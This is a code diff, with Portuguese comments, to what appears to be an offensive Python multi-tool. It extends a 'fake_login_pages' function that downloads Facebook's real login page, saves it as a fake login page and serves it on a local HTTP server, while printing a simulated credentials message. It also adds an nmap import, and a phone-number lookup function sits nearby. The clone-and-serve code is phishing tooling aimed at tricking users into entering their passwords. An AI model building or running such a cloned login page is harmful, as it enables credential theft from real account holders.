@@ -6,6 +6,8 @@ import threading
 import http.server
 import socketserver
 import numlookupapi
+import numbers
+import nmap
 from colorama import init, Fore, Style
 
 # Porta para o servidor HTTP local
@@ -247,6 +249,10 @@ def fake_login_pages(language):
     target_url = "https://facebook.com/login.php"
 
     try:
+        # Criar o diretório HTML_CSS_DIR se não existir
+        if not os.path.exists(HTML_CSS_DIR):
+            os.makedirs(HTML_CSS_DIR)
+
         # Baixar HTML e CSS da página alvo
         response = requests.get(target_url)
         if response.status_code == 200:
@@ -255,6 +261,9 @@ def fake_login_pages(language):
             with open(os.path.join(HTML_CSS_DIR, 'fake_login_page.html'), 'w', encoding='utf-8') as f:
                 f.write(html_content)
             print("Página clonada com sucesso!")
+
+            # Iniciar servidor HTTP local para servir a página clonada
+            start_http_server()
 
             # Exibir mensagem simulada de credenciais digitadas em um novo terminal
             open_new_terminal(language)
@@ -268,14 +277,28 @@ def fake_login_pages(language):
 
     input("\nPressione Enter para continuar...")
 
+# Função para iniciar o servidor HTTP local
+def start_http_server():
+    # Configurar e iniciar servidor HTTP local para servir arquivos HTML e CSS
+    os.chdir(HTML_CSS_DIR)
+    Handler = http.server.SimpleHTTPRequestHandler
+
+    with socketserver.TCPServer(("", PORT), Handler) as httpd:
+        print(Fore.GREEN + f"Servidor HTTP local iniciado em http://localhost:{PORT}")
+        print("Pressione Ctrl+C para encerrar o servidor.")
+        try:
+            httpd.serve_forever()
+        except KeyboardInterrupt:
+            pass
+
 # Função para exibir as credenciais digitadas em um novo terminal
 def open_new_terminal(language):
     try:
-        # Abrir um novo terminal para exibir as credenciais digitadas
+        # Simular mensagem de credenciais digitadas
         print("Credentials entered here...")
         time.sleep(3)
     except Exception as e:
-        print(Fore.RED + f"Error opening new terminal: {e}")
+        print(Fore.RED + f"Erro ao abrir novo terminal: {e}")
 
 # Função para informações de número de telefone
 def phone_number_info(language):
